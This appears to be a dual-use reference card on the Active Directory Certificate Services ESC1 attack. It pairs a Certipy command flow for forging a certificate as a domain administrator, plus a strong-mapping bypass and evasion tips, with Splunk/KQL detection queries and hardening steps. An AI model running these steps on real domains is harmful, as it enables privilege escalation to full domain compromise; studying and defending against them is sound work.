name: AD CS ESC1 via Certipy (Linux - Enrollee-Supplied SAN)
description: Linux companion to the Windows ESC1 card. When a certificate template allows the enrollee to supply the Subject Alternative Name (ENROLLEE_SUPPLIES_SUBJECT) and grants client authentication, request a certificate with the SAN set to a privileged user, then authenticate with it via PKINIT to obtain that user's TGT and NT hash.
notes:
=== ESC1 CONDITIONS (all true) ===
  - Template EKU includes Client Authentication (or Any Purpose / no EKU).
  - Template has ENROLLEE_SUPPLIES_SUBJECT (you specify the SAN).
  - Low-privileged users can enroll (enrollment rights).
  - Manager approval NOT required, no authorized signatures required.

=== FLOW (certipy) ===
  1. Find it:  certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout
       -> template flagged [!] ESC1.
  2. Request as a privileged SAN:
       certipy-ad req ... -template <vuln_template> -upn administrator@<domain>
       (or -sid / -dns for machine/other identities)
  3. Authenticate:
       certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>
       -> administrator TGT + NT hash (UnPAC).

=== ESC1 vs ESC16 ===
  ESC1 = a specific TEMPLATE lets you supply the SAN.
  ESC16 = the whole CA drops the SID security extension, so UPN mapping alone wins.
  If DCs enforce strong mapping (KB5014754), pair ESC1 with -sid for the target's SID.

=== CLOCK ===
  PKINIT needs time in sync with the DC (see ad-faketime-kerberos).

Fix clock skew before PKINIT cert auth.

defense.why_it_works: The template lets the enrollee specify the SAN and grants client authentication to low-privileged users, so the attacker requests a certificate naming a privileged account and the DC authenticates them as that account via PKINIT.
defense.prerequisites: Enrollment rights on an ESC1 template (enrollee-supplied SAN + client-auth EKU, no manager approval) and a clock in sync with the DC.
defense.impact: Authentication as any account (up to Domain Admin) via a forged-SAN certificate - domain compromise.
defense.detection: [MITRE T1649] Event 4886/4887 on the CA (certificate requested/issued) where the requester differs from the subject/SAN; Event 4768 PKINIT logon as the impersonated account; certipy find flagging the template ESC1.
defense.artifacts: 4886/4887 CA enrollment with mismatched requester vs SAN; 4768 PKINIT with certificate info; issued .pfx on the attacker host.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" (EventCode=4886 OR EventCode=4887)
| table _time, Requester, CertificateTemplate, ComputerName, Attributes

index=wineventlog sourcetype="WinEventLog:Security" EventCode=4768 Certificate_Thumbprint=*
| stats count by Account_Name, Client_Address, Certificate_Thumbprint
defense.sentinel_kql:
SecurityEvent
| where EventID in (4886, 4887)
| project TimeGenerated, Requester, CertificateTemplate, ComputerName
| join kind=leftouter (
    SecurityEvent | where EventID == 4768 and isnotempty(CertificateThumbprint)
    | project PkinitTime=TimeGenerated, TargetUserName, IpAddress, CertificateThumbprint
) on $left.Requester == $right.TargetUserName
| sort by TimeGenerated desc
defense.prevention: Remove ENROLLEE_SUPPLIES_SUBJECT from client-auth templates or require manager approval; restrict enrollment rights; enable strong certificate mapping on DCs (KB5014754 Full Enforcement); audit templates with certipy/PSPKIAudit; treat CA as Tier-0; monitor 4886/4887.
defense.evasion: Use the certificate for a single PKINIT auth only; request during normal enrollment activity to blend in.
defense.misconfiguration: A certificate template grants low-privileged users enrollment, permits an enrollee-supplied SAN, includes a client-authentication EKU, and does not require manager approval.
defense.vulnerable_config:
# certipy flags it:
certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout
# Look for: [!] ESC1 - 'Enrollee Supplies Subject' + Client Authentication + low-priv enroll.
defense.secure_config:
# On the template: clear 'Supply in the request' for the subject name, OR require CA manager approval.
# Restrict enrollment to specific groups. Enable strong certificate mapping on DCs (KB5014754 Full Enforcement).

interview.q: What four template conditions make ESC1 exploitable?
interview.a: The template allows the enrollee to supply the SAN (ENROLLEE_SUPPLIES_SUBJECT), includes a client-authentication EKU (or Any Purpose / no EKU), permits low-privileged users to enroll, and does not require manager approval or authorized signatures. Together they let you request a cert naming any account and log in as it.

interview.q: How does KB5014754 strong mapping change the attack, and how do you adapt?
interview.a: With Full Enforcement, DCs require a strong SID binding, so a UPN/SAN-only cert is rejected. You adapt by supplying the target's SID in the request (certipy -sid) when you can, or pivot to ESC16 where the CA drops the SID extension entirely.
